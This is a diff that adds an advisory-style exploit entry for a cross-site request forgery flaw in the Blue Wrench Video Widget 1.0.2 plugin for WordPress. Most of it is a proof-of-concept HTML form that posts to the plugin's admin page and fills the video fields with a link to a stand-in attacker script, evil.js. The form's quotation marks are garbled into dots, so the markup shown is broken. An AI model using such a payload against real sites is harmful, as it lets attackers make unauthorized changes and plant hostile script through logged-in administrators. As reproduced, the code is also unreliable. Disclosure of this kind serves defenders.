@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/63800/info
+
+The Blue Wrench Video Widget plugin for WordPress is prone to a cross-site request-forgery vulnerability.
+
+An attacker can exploit the cross-site request forgery issue to perform unauthorized actions in the context of a logged-in user of the affected application. This may aid in other attacks.
+
+Blue Wrench Video Widget 1.0.2 is vulnerable; other versions may also be affected. 
+
+<form id=.upload-form. 
+action=.http://www.example1.com/wordpress/wp-admin/admin.php?page=bw-videos. 
+method=.post.>
+<table class=.form-table.>
+<tbody>
+<tr valign=.top.>
+<th scope=.row.>Title</th>
+<td><input id=.bw_title. type=.text. maxlength=.75. name=.bw_title. 
+size=.70. value=.http://www.example2.com/code/evil.js. />
+</tr>
+<tr valign=.top .>
+<th scope=.row.>URL</th>
+<td><input id=.bw_url. type=.text. maxlength=.75. name=.bw_url. 
+size=.70. value=.http://www.example2.com/code/evil.js. />
+</td>
+</tr>
+</tbody>
+</table>
+</form>
